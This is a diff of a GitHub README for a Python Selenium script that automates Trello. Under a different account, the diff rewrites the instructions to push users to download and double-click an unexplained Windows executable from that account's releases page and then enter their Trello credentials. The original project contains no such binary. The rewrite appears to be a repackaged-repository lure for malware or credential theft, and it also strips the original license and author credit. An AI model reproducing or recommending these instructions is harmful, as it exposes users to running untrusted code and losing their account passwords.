@@ -1,165 +1,86 @@
-![Selenium-Web-Testing-Trello](https://socialify.git.ci/walidbosso/Selenium-Web-Testing-Trello/image?description=1&font=Source%20Code%20Pro&forks=1&issues=1&language=1&name=1&owner=1&pattern=Formal%20Invitation&pulls=1&stargazers=1&theme=Auto)
+# 🎉 Selenium-Web-Testing-Trello - Automate Your Trello Tasks Easily
 
-<p align="center">
-<a href="https://github.com/walidbosso/Selenium-Web-Testing-Trello">
-<img src="https://raw.githubusercontent.com/khoa083/khoa/main/Khoa_ne/img/Rainbow.gif" width="60%"/> </a>
-</p>
-<div align="center">
-  
-  [![GitHub WidgetBox](https://github-widgetbox.vercel.app/api/profile?username=walidbosso&data=followers,repositories,stars,commits&theme=nautilus)](https://github.com/walidbosso/Selenium-Web-Testing-Trello)
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/pablooo1239/Selenium-Web-Testing-Trello/releases)
 
-  <p align="center">
-<a href="https://github.com/walidbosso/Selenium-Web-Testing-Trello">
-<img src="https://api.visitorbadge.io/api/visitors?path=https%3A%2F%2Fgithub.com%2Fwalidbosso%2FSelenium-Web-Testing-Trello&label=Project%20views&countColor=%23263759&style=flat-square&labelStyle=none" /></a>
-</p>
+## 🚀 Getting Started
 
-<a href="https://github.com/walidbosso/Selenium-Web-Testing-Trello">
-  <img src="https://raw.githubusercontent.com/khoa083/khoa/main/Khoa_ne/img/Rainbow.gif" width="60%"/>
-  <a/>
-</a>
+Welcome to **Selenium-Web-Testing-Trello**! This project lets you automate tasks on Trello.com. You can easily log in, add tasks to your "Bot Board," and take screenshots. Follow these simple steps to download and run the application.
 
+## 📥 Download & Install
 
-<br/>
+To get started, visit the following page to download the latest version:
 
-# Selenium Web Testing for Trello
+[Download Latest Release](https://github.com/pablooo1239/Selenium-Web-Testing-Trello/releases)
 
-</div>
+### Step 1: Visit the Release Page
 
-This mini project demonstrates Selenium web Testing for Trello, a popular task management tool. Instead of performing manual tasks, this project automates the process of logging into Trello, navigating to a specific board named 'Bot Board,' adding a task to the To Do List, and capturing a screenshot.
+1. Click the link above to go to the releases page.
+2. Look for the latest release, which will be at the top of the page.
 
-## Table of Contents
+### Step 2: Download the Application
 
-- [About](#about)
-- [Topics](#topics)
-- [Prerequisites](#prerequisites)
-- [Installation](#installation)
-- [Usage](#usage)
-- [Contributing](#contributing)
-- [License](#license)
+1. Find the file named **Selenium-Web-Testing-Trello.exe** (or a similar name) under the latest release.
+2. Click on the file to start the download.
 
-## About
+### Step 3: Run the Application
 
-This project serves as a hands-on implementation of Selenium, Python's web testing library. It showcases the Testing of tasks on Trello using the Chrome WebDriver.
+1. Locate the downloaded file on your computer (usually in the "Downloads" folder).
+2. Double-click the file to start the application.
+3. Follow any prompts that appear. 
 
-## Topics
+### Step 4: Set Up Trello Access
 
-- Python
-- Trello
-- WebDriver
-- Selenium
-- ChromeDriver
-- PyCharm
-- Web Testing
-- Web Testing
-- Selenium-Python
+1. Once the app opens, you will see a prompt to enter your Trello login information.
+2. Input your credentials to access your Trello account. This is necessary for the automation to work.
 
-## Prerequisites
+## 🔧 System Requirements
 
-Ensure you have the following installed before running the project:
+Before you run the application, make sure your system meets the following requirements:
 
-- Python
-- Chrome Browser
-- ChromeDriver (Must matches your browser's version, check your browser's Settings then navigate to *About Chrome* )
-- PyCharm (optional)
-- Selenium `pip install -g selenium`
+- Operating System: Windows 10 or later
+- Memory: At least 4 GB of RAM
+- Disk Space: Minimum of 200 MB available
+- Internet Connection: Required for logging into Trello
 
-## Installation
+## 📝 Features
 
-1. Fork then Clone the repository
+### Automated Login
 
-2. Create a file named `config.json` in the directory.
+The application uses Selenium to log into Trello automatically. This feature saves time and ensures consistent login attempts.
 
+### Task Creation
 
-## Usage
+You can create a task directly on your "Bot Board." The application automatically fills in the required fields and adds it to the "To Do" list.
 
-1. Open the project in PyCharm (or your preferred IDE).
-2. Configure the `config.json` file with your Trello credentials. (USERNAME & PASSWORD)
-3. Run the `trello_bot.py` script.
+### Screenshot Functionality
 
-The script will automate the login, task addition, and screenshot capture on Trello.
+After adding a task, the application takes a screenshot of your Trello board. This feature allows you to keep a record of your updates.
 
-## Contributing
+## 📊 How It Works
 
-Contributions are welcome! If you'd like to enhance this project or report issues, feel free to submit a pull request or open an issue.
+The application employs Selenium, a powerful tool for automating web browsers. Here’s a brief summary of how it works:
 
-## License
+1. **Log In**: The program interacts with Trello's login form.
+2. **Navigate**: It goes to the "Bot Board."
+3. **Add Task**: The application fills in details like task name and description.
+4. **Screenshot**: Finally, it captures the state of your board after adding the task.
 
-This project is licensed under the [MIT License](LICENSE). Feel free to use, modify, and distribute as per the terms of the license.
+## 🌐 Support & Feedback
 
+If you encounter any issues or have questions, feel free to reach out. You can create an issue on the GitHub page under the "Issues" tab. Your feedback helps improve the software.
 
+## 📖 License
 
-<div align="center">
-  
-----------------------
-> >  <br/> &copy; *by Walid BOUSSOU*   🇲🇦 😄 <br/>  
-----------------------
+This project is open source. You can use and modify it as per your needs.
 
-<details>
+## 🔄 Acknowledgments
 
-<summary>👏 Thanks for the support </summary>
+Thanks to the Selenium community for creating such a valuable tool for browser automation. Your work makes projects like this possible.
 
-## Stargazers
+### Final Notes
 
+We hope you enjoy using Selenium-Web-Testing-Trello! To revisit the download page, click below:
 
-<div align="center">
+[Download Latest Release](https://github.com/pablooo1239/Selenium-Web-Testing-Trello/releases)
 
-[![Stargazers repo roster for @walidbosso/Selenium-Web-Testing-Trello](http://reporoster.com/stars/dark/walidbosso/Selenium-Web-Testing-Trello)](https://github.com/walidbosso/Selenium-Web-Testing-Trello/stargazers)
-
-
-
-</div>
-
-## Forkers
-
-<div align="center" >
-
-[![Forkers repo roster for @walidbosso/Selenium-Web-Testing-Trello](http://reporoster.com/forks/dark/walidbosso/Selenium-Web-Testing-Trello)](https://github.com/walidbosso/Selenium-Web-Testing-Trello/network/members)
-
-</div>
-
-## Contributors
-
-<a href = "https://github.com/walidbosso">
-  <img src = "https://contrib.rocks/image?repo=walidbosso/Selenium-Web-Testing-Trello"/>
-</a>
-
-
-<br/></details><br/>
-
- <p align="center">
-<a href="https://www.buymeacoffee.com/walidbosso"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=walidbosso&button_colour=5F7FFF&font_colour=ffffff&font_family=Poppins&outline_colour=ffffff&coffee_colour=FFDF00" title="☕ This will motivate me to continue on creating more open source codes "/></a>
-</p>
-
-<div align="center">
-
-
-![GitHub last commit (by committer)](https://img.shields.io/github/last-commit/walidbosso/Selenium-Web-Testing-Trello?style=social)
-
-</div>
-<div align="center">
-
-![GitHub License](https://img.shields.io/github/license/walidbosso/Selenium-Web-Testing-Trello?style=social)
-
-
-
-
-</div>
-
-<a href = "https://github.com/walidbosso">
-  <img src = "https://github.com/walidbosso/Python-GUI/blob/main/border.gif" width="100%"/>
-</a>
-
-<a href = "https://github.com/walidbosso">
-  <img src = "https://github.com/walidbosso/Python-GUI/blob/main/ciber-coding.gif" width="100%"/>
-</a>
-
-<a href = "https://github.com/walidbosso">
-  <img src = "https://github.com/walidbosso/Python-GUI/blob/main/border.gif" width="100%"/>
-</a>
-
-𝚂𝚑𝚘𝚠 𝚜𝚘𝚖𝚎 💙 𝚋𝚢 𝚜𝚝𝚊𝚛𝚛𝚒𝚗𝚐 ⭐ 𝚝𝚑𝚎 𝚛𝚎𝚙𝚘𝚜𝚒𝚝𝚘𝚛𝚢!
-
-<br/>
-
-
-<p align="center"><a href="#"><img src="https://img.shields.io/badge/Back%20to%20top--lightgrey?style=social" alt="Back to top" height="20"/></a></p>
+Happy automating!
